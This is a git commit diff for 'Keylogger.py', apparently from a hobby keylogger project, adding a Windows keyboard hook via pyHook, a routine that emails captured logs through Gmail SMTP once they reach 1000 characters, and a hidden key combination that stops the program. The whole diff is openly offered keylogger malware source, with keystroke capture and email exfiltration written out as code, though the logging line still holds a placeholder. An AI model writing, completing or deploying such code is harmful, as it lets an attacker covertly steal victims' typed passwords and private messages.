8cddd876075ef62298ff8d4e27b9a1a3da670b11
xp4xbox <nicman1080@gmail.com>
2017-09-14 18:39:38 -0400

    You can now stop the program + email sending fix
    CTRL+RIGHT_SHIFT+H Stops the program.

--- Keylogger.py
+++ Keylogger.py
@@ -1,25 +1,46 @@
-import smtplib
-import time
+import smtplib, time
+import pythoncom, pyHook
+from pyHook import GetKeyState, HookConstants
 
 strEmailAc = "email@gmail.com"
 strEmailPass = "pass"
 
-def SendMessages(strLogs, strEmailAc, strEmailPass):
-    try:
-        strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
-        strMessage = strDateTime + "\n\n" + strLogs
+blnStop = "False"
 
-        strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)
+def OnKeyboardEvent(event):
+    global strLogs
 
+    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
+        try:
+            if blnStop == "True":
+                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
+            else:
+                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
+            strMessage = strDateTime + "\n\n" + strLogs
+            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)
 
-        SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
-        SmtpServer.ehlo()   # identifies you to the smtp server
-        SmtpServer.login(strEmailAc, strEmailPass)
-        SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
-    except:
-        time.sleep(5)   # freeze program for 5 seconds to try again
-        SendMessages(strLogs, strEmailAc, strEmailPass)
+            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+            SmtpServer.ehlo()   # identifies you to the smtp server
+            SmtpServer.login(strEmailAc, strEmailPass)
+            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
+        except:
+            time.sleep(5)   # freeze program for 5 seconds to try again
+            SendMessages(strLogs, strEmailAc, strEmailPass, blnStop)
 
+    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
+        # CTRL-RIGHT_SHIFT-H to stop the program
+        hooks_manager.UnhookKeyboard()
+        SendMessages(strLogs, strEmailAc, strEmailPass, "True")
+        exit()
 
-strLogs = "aaaaaa"
-SendMessages(strLogs, strEmailAc, strEmailPass)
+    strLogs = "aaaaaa"
+
+    if len(strLogs) >= 1000:
+        SendMessages(strLogs, strEmailAc, strEmailPass, blnStop)
+
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
